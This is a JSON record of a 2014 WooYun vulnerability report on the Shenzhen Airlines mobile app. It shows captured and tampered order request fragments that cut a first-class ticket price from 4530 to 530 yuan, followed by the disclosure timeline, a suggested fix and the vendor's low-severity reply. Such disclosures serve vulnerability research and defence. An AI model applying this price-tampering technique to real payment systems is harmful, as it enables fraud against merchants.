{"id": 51849, "wybug_id": "wooyun-2014-073185", "wybug_title": "深圳航空出现支付漏洞，0元购机票", "wybug_corp": "深圳航空", "wybug_author": "IcesWord", "wybug_date": "2014-08-20 17:56", "wybug_open_date": "2014-11-18 17:58", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["支付漏洞", "深圳航空", "元支付", "元支付机票", "元机票"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向公众公开  简要描述： 深圳航空，对机票价格验证不严，可以任意篡改订单价格，0元购机票 详细说明：  深圳航空手机客户端，对机票价格验证不严，下单订单的时候抓包，可以任意篡改订单价格，0元购机票以下是2014-08-21，07:30起飞的深圳到北京的ZH9959，头等舱的订单，抓包后的数据，可以看到 含税的价格是4530        <xsd:anyType xsi:type=\"xsd:string\">;DC;iphoneClient;false;true;4530;0</xsd:anyType>        <xsd:anyType xsi:type=\"xsd:string\">SZX,PEK,2014-08-21,07:30,ZH9959,4360,F,249,50,120,2630,F,150,0,60,0,0,0,0,0,&#x6DF1;&#x5733;,&#x5317;&#x4EAC;,RE2014080652828,1,&#x65E0;,false,AD3ABC2A-EB45-468D-AE37-93498367B1E6,2,UID201408201124334216,2014-08-21,10:45</xsd:anyType> 修改价格后提交，我修改的价格为530元（不要太狠吗，0元太明显了，哈哈）<xsd:anyType xsi:type=\"xsd:string\">;DC;iphoneClient;false;true;530;0</xsd:anyType>        <xsd:anyType xsi:type=\"xsd:string\">SZX,PEK,2014-08-21,07:30,ZH9959,360,F,249,50,120,2630,F,150,0,60,0,0,0,0,0,&#x6DF1;&#x5733;,&#x5317;&#x4EAC;,RE2014080652828,1,&#x65E0;,false,AD3ABC2A-EB45-468D-AE37-93498367B1E6,2,UID201408201124334216,2014-08-21,10:45</xsd:anyType>提交成功，查看我的订单的时候就会是530元了，而不是4530元了。   漏洞证明：  下图是正常机票的价格\n\n下图为修改价格后的订单价格\n\n   修复方案：  对价格进行校验   版权声明：转载请注明来源 IcesWord@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-08-22 11:11 厂商回复： 感谢您对深航系统关心，该方式不能完成出票流程。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}